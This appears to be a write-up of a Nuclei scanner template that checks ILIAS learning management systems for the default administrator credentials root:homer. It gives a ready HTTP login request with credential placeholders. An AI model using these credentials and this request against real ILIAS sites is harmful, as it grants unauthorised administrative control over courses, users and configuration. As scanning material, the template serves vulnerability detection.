# Nuclei Template: ILIAS LMS - Default Admin Credentials
**Template ID:** ilias-default-login
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`ilias-default-login.yaml`)

## Vulnerability Information & PoC

## Description
The ILIAS learning management system was found to be using default administrator credentials (root:homer). An attacker was able to gain full administrative access to manage courses, users, and system configuration.

## Steps to reproduce / Exploit Payload
```http
GET /login.php HTTP/1.1
Host: {{Hostname}}

POST /ilias.php?baseClass=ilStartUpGUI&cmd=post&fallbackCmd=doStandardAuthentication&client_id={{client_id}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&cmd%5BdoStandardAuthentication%5D=Login
```

## References
- https://www.ilias.de/
- https://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.107313
